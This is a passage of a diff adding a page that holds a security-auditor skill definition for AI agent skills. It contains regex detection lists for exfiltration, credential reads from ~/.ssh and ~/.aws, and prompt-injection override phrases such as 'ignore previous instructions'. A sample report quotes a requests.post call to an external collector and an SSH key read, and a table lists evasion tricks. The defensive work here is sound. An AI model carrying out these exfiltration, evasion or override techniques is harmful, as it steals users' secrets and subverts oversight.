+        r&quot;`[^`]+`&quot;,  # backtick execution in shell
+    ],
+    &quot;code_execution&quot;: [
+        r&quot;\beval\(&quot;,
+        r&quot;\bexec\(&quot;,
+        r&quot;\bcompile\(&quot;,
+        r&quot;__import__\(&quot;,
+        r&quot;importlib\.import_module\(&quot;,
+        r&quot;new\s+Function\(&quot;,  # JavaScript
+    ],
+    &quot;obfuscation&quot;: [
+        r&quot;base64\.b64decode\(&quot;,
+        r&quot;codecs\.decode\(&quot;,
+        r&quot;bytes\.fromhex\(&quot;,
+        r&quot;chr\(\d+\)\s*\+\s*chr\(&quot;,  # chr() chains
+        r&quot;\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}.*\\x[0-9a-f]{2}&quot;,  # hex strings
+    ],
+    &quot;network_exfiltration&quot;: [
+        r&quot;requests\.post\(&quot;,
+        r&quot;requests\.put\(&quot;,
+        r&quot;urllib\.request\.urlopen\(&quot;,
+        r&quot;httpx\.(post|put)\(&quot;,
+        r&quot;aiohttp\.ClientSession\(&quot;,
+        r&quot;socket\.connect\(&quot;,
+        r&quot;fetch\([&#x27;\&quot;]https?://&quot;,  # JavaScript
+    ],
+    &quot;credential_harvesting&quot;: [
+        r&quot;~/.ssh&quot;,
+        r&quot;~/.aws&quot;,
+        r&quot;~/.config&quot;,
+        r&quot;~/.gnupg&quot;,
+        r&quot;os\.environ\[&quot;,  # reading env vars
+        r&quot;open\(.*\.pem&quot;,
+        r&quot;open\(.*\.key&quot;,
+    ],
+    &quot;privilege_escalation&quot;: [
+        r&quot;\bsudo\b&quot;,
+        r&quot;chmod\s+777&quot;,
+        r&quot;chmod\s+\+s&quot;,
+        r&quot;crontab&quot;,
+        r&quot;setuid&quot;,
+    ],
+}
+
+HIGH_PATTERNS = {
+    &quot;unsafe_deserialization&quot;: [
+        r&quot;pickle\.loads?\(&quot;,
+        r&quot;yaml\.load\([^)]*\)&quot;,  # without SafeLoader
+        r&quot;marshal\.loads?\(&quot;,
+        r&quot;shelve\.open\(&quot;,
+    ],
+    &quot;file_system_abuse&quot;: [
+        r&quot;open\(.*/etc/&quot;,
+        r&quot;open\(.*~/.bashrc&quot;,
+        r&quot;open\(.*~/.profile&quot;,
+        r&quot;open\(.*~/.zshrc&quot;,
+        r&quot;os\.symlink\(&quot;,
+        r&quot;shutil\.(rmtree|move)\(&quot;,
+    ],
+}
+```
+
+### Prompt Injection Detection
+
+```python
+# Patterns to detect in .md files
+
+PROMPT_INJECTION_PATTERNS = {
+    &quot;system_override&quot;: [
+        r&quot;ignore\s+(all\s+)?previous\s+instructions&quot;,
+        r&quot;ignore\s+(all\s+)?prior\s+instructions&quot;,
+        r&quot;disregard\s+(all\s+)?previous&quot;,
+        r&quot;you\s+are\s+now\s+(a|an)\s+&quot;,
+        r&quot;from\s+now\s+on\s+(you|your)\s+&quot;,
+        r&quot;new\s+system\s+prompt&quot;,
+        r&quot;override\s+system&quot;,
+    ],
+    &quot;role_hijacking&quot;: [
+        r&quot;act\s+as\s+(root|admin|superuser)&quot;,
+        r&quot;pretend\s+you\s+(have\s+no|don&#x27;t\s+have)\s+restrictions&quot;,
+        r&quot;you\s+have\s+no\s+limitations&quot;,
+        r&quot;unrestricted\s+mode&quot;,
+        r&quot;developer\s+mode\s+enabled&quot;,
+        r&quot;jailbreak&quot;,
+    ],
+    &quot;safety_bypass&quot;: [
+        r&quot;skip\s+safety\s+checks&quot;,
+        r&quot;disable\s+content\s+filter&quot;,
+        r&quot;bypass\s+security&quot;,
+        r&quot;remove\s+(all\s+)?guardrails&quot;,
+        r&quot;no\s+restrictions\s+apply&quot;,
+    ],
+    &quot;data_extraction&quot;: [
+        r&quot;send\s+(the\s+)?contents?\s+of&quot;,
+        r&quot;upload\s+file\s+to&quot;,
+        r&quot;POST\s+to\s+https?://&quot;,
+        r&quot;exfiltrate&quot;,
+        r&quot;transmit\s+data\s+to&quot;,
+    ],
+    &quot;hidden_instructions&quot;: [
+        r&quot;\u200b&quot;,          # zero-width space
+        r&quot;\u200c&quot;,          # zero-width non-joiner
+        r&quot;\u200d&quot;,          # zero-width joiner
+        r&quot;\ufeff&quot;,          # byte order mark
+        r&quot;&lt;!--\s*(?:system|instruction|command)&quot;,  # HTML comments with directives
+    ],
+}
+```
+
+## Audit Report Format
+
+```
++=============================================+
+|  SKILL SECURITY AUDIT REPORT                |
+|  Skill: example-skill                       |
+|  Date: 2026-03-09                           |
+|  Verdict: FAIL                              |
++=============================================+
+|  CRITICAL: 2  |  HIGH: 1  |  INFO: 3       |
++=============================================+
+
+CRITICAL [CODE-EXEC] scripts/helper.py:42
+  Pattern: eval(user_input)
+  Risk: Arbitrary code execution from untrusted input
+  Fix: Replace eval() with ast.literal_eval() or explicit parsing
+
+CRITICAL [NET-EXFIL] scripts/analyzer.py:88
+  Pattern: requests.post(&quot;https://external.com/collect&quot;, data=results)
+  Risk: Data exfiltration to external server
+  Fix: Remove outbound network calls or verify destination is trusted
+  and explicitly documented
+
+HIGH [FS-BOUNDARY] scripts/scanner.py:15
+  Pattern: open(os.path.expanduser(&quot;~/.ssh/id_rsa&quot;))
+  Risk: Reads SSH private key outside skill scope
+  Fix: Remove filesystem access outside skill directory
+
+INFO [DEPS-UNPIN] requirements.txt:3
+  Pattern: requests&gt;=2.0
+  Risk: Unpinned dependency may introduce vulnerabilities
+  Fix: Pin to specific version: requests==2.31.0
+
+INFO [LARGE-FILE] assets/data.bin (2.4MB)
+  Risk: Large binary file may hide payloads
+  Fix: Verify file contents or remove if unnecessary
+
+INFO [SUBPROCESS-SAFE] scripts/lint.py:22
+  Pattern: subprocess.run([&quot;ruff&quot;, &quot;check&quot;, &quot;.&quot;])
+  Note: Safe usage with list args and no shell=True
+```
+
+## Verdict Criteria
+
+| Verdict | Criteria | Action |
+|---------|----------|--------|
+| **PASS** | Zero CRITICAL, zero HIGH findings | Safe to install |
+| **WARN** | Zero CRITICAL, one or more HIGH findings | Review HIGH findings manually before installing |
+| **FAIL** | One or more CRITICAL findings | Do NOT install without remediation |
+
+### Strict Mode
+
+In strict mode (for CI/CD gates), any HIGH finding upgrades the verdict to FAIL.
+
+## CI/CD Integration
+
+```yaml
+# .github/workflows/audit-skills.yml
+name: Skill Security Audit
+on:
+  pull_request:
+    paths:
+      - &#x27;skills/**&#x27;
+      - &#x27;engineering/**&#x27;
+
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Audit changed skills
+        run: |
+          CHANGED_SKILLS=$(git diff --name-only origin/main... | grep -oP &#x27;(skills|engineering)/[^/]+&#x27; | sort -u)
+          EXIT=0
+          for skill in $CHANGED_SKILLS; do
+            echo &quot;Auditing: $skill&quot;
+            python3 scripts/skill_security_auditor.py &quot;$skill&quot; --strict --json &gt;&gt; audit-results.jsonl
+            if [ $? -ne 0 ]; then EXIT=1; fi
+          done
+          exit $EXIT
+
+      - name: Upload audit results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: skill-audit-results
+          path: audit-results.jsonl
+```
+
+## Manual Audit Checklist
+
+When automated scanning is not available, use this manual checklist:
+
+```markdown
+### Code Files (.py, .sh, .js, .ts)
+- [ ] No eval(), exec(), or compile() calls
+- [ ] No os.system() or subprocess with shell=True
+- [ ] No outbound network requests (requests.post, fetch, socket)
+- [ ] No reads from ~/.ssh, ~/.aws, ~/.config, or other user directories
+- [ ] No writes outside the skill directory
+- [ ] No base64 decoding of unknown payloads
+- [ ] No sudo, chmod 777, or privilege escalation
+- [ ] No pickle.loads() or unsafe YAML loading
+- [ ] subprocess calls use list arguments, not strings
+
+### Markdown Files (SKILL.md, references/*.md)
+- [ ] No &quot;ignore previous instructions&quot; or similar overrides
+- [ ] No &quot;act as root/admin&quot; or role hijacking
+- [ ] No hidden zero-width characters (paste into a hex editor to check)
+- [ ] No HTML comments containing instructions
+- [ ] No instructions to send data to external URLs
+- [ ] No requests for &quot;full filesystem access&quot; or &quot;run any command&quot;
+
+### Dependencies (requirements.txt, package.json)
+- [ ] All versions pinned to exact (==, not &gt;=)
+- [ ] Package names verified against official repositories
+- [ ] No typosquatting (reqeusts, colourma, etc.)
+- [ ] No pip install or npm install commands in scripts
+
+### File Structure
+- [ ] No .env or credential files
+- [ ] No binary executables (.exe, .so, .dll)
+- [ ] No symbolic links
+- [ ] No files larger than 1MB without clear justification
+- [ ] No hidden directories (.hidden/)
+```
+
+## Known Evasion Techniques
+
+Attackers may try to bypass detection. Be aware of:
+
+| Technique | Example | Detection Difficulty |
+|-----------|---------|---------------------|
+| String concatenation | `e` + `v` + `a` + `l` | Medium — check for dynamic function construction |
+| `getattr` dispatch | `getattr(os, &#x27;sys&#x27; + &#x27;tem&#x27;)(&#x27;cmd&#x27;)` | Hard — requires control flow analysis |
+| Import aliasing | `from os import system as helper` | Medium — track import aliases |
+| Encoded payloads | `exec(base64.b64decode(&#x27;...&#x27;))` | Easy — flag any base64 decode + exec |
+| Time-delayed triggers | Executes only after specific date | Hard — requires dynamic analysis |
+| Conditional activation | Triggers only on specific hostnames | Hard — requires dynamic analysis |
+| Unicode homoglyphs | Using Cyrillic characters that look like Latin | Medium — normalize Unicode before scanning |
+
+## Limitations
+
+- **Static analysis only** — does not execute code; cannot detect runtime-only behavior
+- **Pattern-based detection** — sufficiently creative obfuscation may bypass detection
+- **No live CVE database** — dependency checks use local patterns, not real-time vulnerability feeds
+- **Cannot detect logic bombs** — time-delayed or conditional payloads require dynamic analysis
+- **Limited to known patterns** — novel attack techniques may not be covered
+
+**When in doubt after an audit, do not install.** Ask the skill author for clarification on any flagged patterns.
+
+## Common Pitfalls
+
+- **Trusting skills from &quot;official&quot; sources without auditing** — supply chain attacks target popular packages
+- **Skipping audit for &quot;small&quot; skills** — a single `eval()` in a 10-line script is enough
+- **Auditing only code, not markdown** — prompt injection in SKILL.md is a real attack vector
+- **Ignoring INFO findings** — they accumulate and indicate poor security hygiene
+- **No re-audit after skill updates** — each version needs independent verification
+
+## Best Practices
+
+1. **Audit before install, always** — treat every skill as untrusted until verified
+2. **Use strict mode in CI** — any HIGH finding blocks the merge
+3. **Pin all dependencies** — unpinned versions are a supply chain risk
+4. **Verify package names** — typosquatting is common and effective
+5. **Check file boundaries** — skills should never access paths outside their directory
+6. **Re-audit on updates** — each new version may introduce new risks
+7. **Maintain an approved skill list** — pre-audited skills that the team trusts
+8. **Report suspicious skills** — notify the skill repository maintainer and community
+
+## Troubleshooting
+
+| Problem | Cause | Solution |
+|---------|-------|----------|
+| False positive on `subprocess.run()` with list arguments | Pattern matches any `subprocess` usage regardless of shell parameter | Verify the call uses a list (not a string) and `shell=True` is absent; mark as INFO, not CRITICAL |
+| Prompt injection flagged in legitimate SKILL.md documentation | Phrases like &quot;ignore previous&quot; appear in educational or example text | Wrap examples in fenced code blocks; the scanner should skip content inside triple-backtick blocks |
+| Audit reports zero findings on a skill with known issues | Skill uses an unsupported language or evasion technique not in the pattern set | Supplement with the Manual Audit Checklist and inspect files line-by-line for the known issue |
+| Large binary file triggers FAIL but the file is a required dataset | Any binary over 1 MB defaults to HIGH severity | Verify the file contents independently (e.g., `file` command, hex dump) and document an explicit exception in the audit report |
+| Dependency typosquatting check produces false negatives | Levenshtein distance threshold is too lenient for short package names | Cross-reference every dependency against the official PyPI or npm registry manually before approving |
+| CI pipeline audit step times out on monorepo PRs | Scanner processes every changed skill sequentially | Limit the scan to only the skills modified in the PR using the `git diff` path filter shown in the CI/CD section |
+| Audit verdict is WARN but team policy requires PASS | Default mode allows HIGH findings to produce WARN instead of FAIL | Enable `--strict` mode so any HIGH finding escalates the verdict to FAIL |
+
+## Success Criteria
+
+- **Zero CRITICAL findings on install**: Every skill deployed to production passes the audit with zero CRITICAL-severity findings.
+- **Audit coverage &gt;= 100% of new skills**: No skill is installed or merged without a completed security audit report on file.
+- **False positive rate &lt; 15%**: Fewer than 15% of flagged findings are confirmed false positives after manual review.
+- **Mean time to audit &lt; 5 minutes per skill**: A standard skill package (under 20 files) completes the full scan in under 5 minutes.
+- **Remediation turnaround &lt; 24 hours**: CRITICAL and HIGH findings are resolved or explicitly risk-accepted within one business day.
+- **CI gate adoption = 100% of skill repositories**: Every repository that hosts skills runs the audit workflow on every pull request.
+- **Re-audit compliance &gt;= 95%**: At least 95% of skills are re-audited within one release cycle after any version update.
+
+## Scope &amp; Limitations
+
+**This skill covers:**
+- Static pattern-based detection of dangerous code constructs in Python, Bash, JavaScript, and TypeScript files
+- Prompt injection scanning across all markdown files within a skill package
+- Dependency supply chain validation for `requirements.txt` and `package.json`
+- File structure boundary checks including symlinks, binaries, hidden files, and oversized payloads
+
+**This skill does NOT cover:**
+- Runtime or dynamic analysis — code is never executed during the audit (see `skill-tester` for runtime validation)
+- Live CVE database lookups or real-time vulnerability feeds (see `dependency-auditor` for active CVE scanning)
+- Infrastructure-level security controls such as network segmentation, container hardening, or cloud IAM policies (see `infrastructure-compliance-auditor` in ra-qm-team)
+- Compliance framework certification against ISO 27001, SOC 2, GDPR, or other regulatory standards (see `information-security-manager-iso27001` and `gdpr-dsgvo-expert` in ra-qm-team)
+
+## Integration Points
+
+| Skill | Integration | Data Flow |
+|-------|-------------|-----------|
+| `dependency-auditor` | Feed audit findings into live CVE scanning for flagged dependencies | Security audit report → dependency-auditor for real-time vulnerability lookup |
+| `ci-cd-pipeline-builder` | Embed the audit workflow as a required check in generated CI/CD pipelines | Pipeline template ← audit job YAML from this skill&#x27;s CI/CD section |
+| `skill-tester` | Run dynamic runtime tests on skills that pass static analysis | PASS verdict from this skill → skill-tester for behavioral validation |
+| `infrastructure-compliance-auditor` | Extend auditing scope from skill-level to infrastructure-level security controls | Skill audit findings → infrastructure auditor for environment-wide posture review |
+| `env-secrets-manager` | Cross-reference credential harvesting findings with secrets management policy | Credential-access flags from audit → env-secrets-manager for policy verification |
+| `pr-review-expert` | Surface audit findings as inline PR review comments on flagged lines | Audit report line references → PR review annotations for developer visibility |
+
+---
+
+## What I Need You to Do
+
+### If I&#x27;m using Claude.ai:
+1. Help me create a new **Claude Project** called &quot;Skill Security Auditor&quot;
+2. Tell me to go to **claude.ai &gt; Projects &gt; Create a project**
+3. The project name should be: &quot;Skill Security Auditor&quot;
+4. Tell me to paste the skill definition above into the **Project Knowledge** section (click &quot;Add content&quot; &gt; &quot;Add text content&quot;)
+5. Set these **Custom Instructions**: &quot;You are an expert Skill Security Auditor in the Engineering domain. Use the project knowledge as your expertise. Follow the workflows, frameworks, and templates defined there. Always provide specific, actionable output.&quot;
+6. Confirm the setup is complete and show me a sample task to test it
+
+### If I&#x27;m using ChatGPT:
+1. Help me create a new **Custom GPT** called &quot;Skill Security Auditor&quot;
+2. Tell me to go to **chatgpt.com &gt; Explore GPTs &gt; Create**
+3. Name: &quot;Skill Security Auditor&quot;
+4. Description: &quot;Security audit and vulnerability scanning for AI agent skills before installation. Detects prompt injection in SKILL.md files, dangerous code patterns (eval, exec, subprocess), network exfiltration, c...&quot;
+5. Paste the skill definition above into the **Instructions** field
+6. Save and confirm it works with a sample task
+
+### If I&#x27;m using another AI tool:
+Tell me how to add this as a custom system prompt or project in my specific tool.
+
+## After Setup
+Once I confirm the project is created, test it with me by running through one of the skill&#x27;s key workflows.
+
+Source: https://github.com/borghei/Claude-Skills/tree/main/engineering/skill-security-auditor/SKILL.md</pre>
+      </details>
+    </div>
   </div>
 </div>
 <div class="tab-content" id="tab-claude">
